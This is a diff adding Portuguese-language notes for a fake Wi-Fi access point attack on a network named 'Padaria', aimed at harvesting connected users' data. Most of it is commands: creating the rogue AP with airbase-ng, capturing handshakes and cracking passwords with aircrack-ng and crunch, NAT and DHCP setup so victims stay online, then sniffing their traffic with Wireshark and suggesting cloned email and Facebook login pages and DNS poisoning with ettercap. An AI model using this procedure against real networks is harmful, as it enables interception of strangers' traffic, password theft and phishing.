@@ -1,0 +1,71 @@
+-Access Point falso (Coletando informações dos usuarios conectados na rede)
+
+-Interface de rede em modo mon
+
+-Crindo o AP
+#airbase-ng wlan0mon -c 1 -e Padaria
+	-Z 4 = Rede WPA2
+-Verificar se ha dispositivo conectado na rede Padaria:
+#airodump wlan0mon -c 1 -w Padaria
+
+-Assim que o usuario digitar a senha, sera coletado o handshake e sera possivel tentar quebrar a senha via aircrack
+#aircrack-ng padaria.cap -w /usr/share/wordlist/rockyou.txt
+
+#crunch 1 1 -t padaria%%%% 0123456789 | aircrack-ng padaria.cap -w - -e <NOME_REDE(BSSID)>
+
+---Da maneira acima, o usuario conectado a rede ainda nao reebera IP, senhdo possivel apenas coletar a senha digitada
+
+-Criando o Ataque para o cliente receber IP e se conectar na internet, para coleta do trafego
+	-É necessario que o PC do atacante esteja conectado na internet
+
+-Habilitar o encaminhamento de pacotes entre interfaces
+#echo 1 > /proc/sys/net/ipv4/ip_forward
+
+-Utilizar o IPTABLES para compartilhar a conexao
+#iptables -t nat -A POSTROUTING -o eth0 -j MASQUERADE
+
+-Configurar o DHCP, para disponibilizar IP para a vitimas
+#apt install isc-dhcp-server
+#vi /etc/default/isc-dhcp-server
+	-Descomentar a linha: DHCPD_CONF
+	-Adicionar a configuração da interface que disponibilizara os IPs: INTERFACES="at0"
+		-at0 = Interface criada quando é gerado o FakeAP
+
+-Configurar as opções do DHCP
+-Realizar a copia do arquivo original:
+#cp /etc/dhcp/dhcp.conf /etc/dhcp/dhcp.conf.org
+
+-Editar as opções de configuração do DHCP
+#>/etc/dhcp/dhcp.conf
+#vi /etc/dhcp/dhcp.conf
+
+ddns-update-style none;
+
+options domain-name-servers 8.8.8.8, 8.8.4.4;
+
+default-lease-time 600;
+max-lease-time 7200;
+
+subnet 10.0.0.0 netmask 255.255.255.0 {
+  range 10.0.0.10 10.0.0.40;
+  option routers 10.0.0.1
+
+
+---
+-Criando o FakeAP
+#airbase-ng -c 1 -e Padaria
+
+-Confirmar o nome da interface de rede criada para o fakeAP
+#iwconfig
+
+-Definir a configurações de rede para essa REDE 
+#ifconfig at0 10.0.0.1/24
+
+-Subir o servidor DHCP:
+#service isc-dhcp-server start
+
+-Nesse momento, quem se conectar ne rede Padaria, ira navegar normalmente, porem, sendo snifado
+	-Usar o Wirehark escutando a rede at0, para snifar o trafego, podendo coletar tanto sites visitados, quando senhas passadas em sites sem criptografia
+	-É possivel criar um Web Server, apontando para o IP 10.0.0.1, com clone de paginas de email/facebook/etc
+	-É possivel criar envenenamento de DNS, para apontar essas requisições para a nossa maquina
+		-Usar ettercap na rede at0
